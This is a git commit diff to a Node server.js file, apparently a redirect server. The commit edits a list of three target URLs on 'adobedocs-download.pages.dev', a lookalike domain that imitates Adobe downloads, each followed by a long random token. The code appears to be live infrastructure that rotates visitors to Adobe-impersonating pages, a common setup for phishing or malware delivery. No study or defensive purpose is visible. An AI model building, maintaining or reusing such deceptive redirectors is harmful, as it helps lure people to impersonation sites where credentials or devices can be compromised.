ab7368a56b6b2ba40409ecc9d00d049d16b5b00e
root005billy <gilliard.pinheiro@tenqualuz.pt>
2025-06-10 17:45:41 +0100

    Update server.js

--- server.js
+++ server.js
@@ -5,9 +5,9 @@ const PORT = process.env.PORT || 3000; // Render assigns a PORT dynamically
 
 // List of URLs for redirection
 const urls = [
-    "https://main.adobedocs-download.pages.dev/6jxin7p4u3xoo5f9nw6artiwe8cx647xk51qzi5uqu5dgrnqfpoj7gmjl8224c",
-    "https://7b3b46f2.adobedocs-download.pages.dev/neyjncjsba5zhcoz54bf2swxs5bafybeig2rf5ebepfrekhfc7rd52b2ibi",
-    "https://main.adobedocs-download.pages.dev/l8224c6jxin7p4u3xoo5f9nw6ark51qzi5uqu5dgrnqfpoj7gmjtiwe8cx647x"
+    "https://main.adobedocs-download.pages.dev/?6jxin7p4u3xoo5f9nw6artiwe8cx647xk51qzi5uqu5dgrnqfpoj7gmjl8224c",
+    "https://7b3b46f2.adobedocs-download.pages.dev/?neyjncjsba5zhcoz54bf2swxs5bafybeig2rf5ebepfrekhfc7rd52b2ibi",
+    "https://main.adobedocs-download.pages.dev/?l8224c6jxin7p4u3xoo5f9nw6ark51qzi5uqu5dgrnqfpoj7gmjtiwe8cx647x"
 ];
 
 // Route to handle redirection
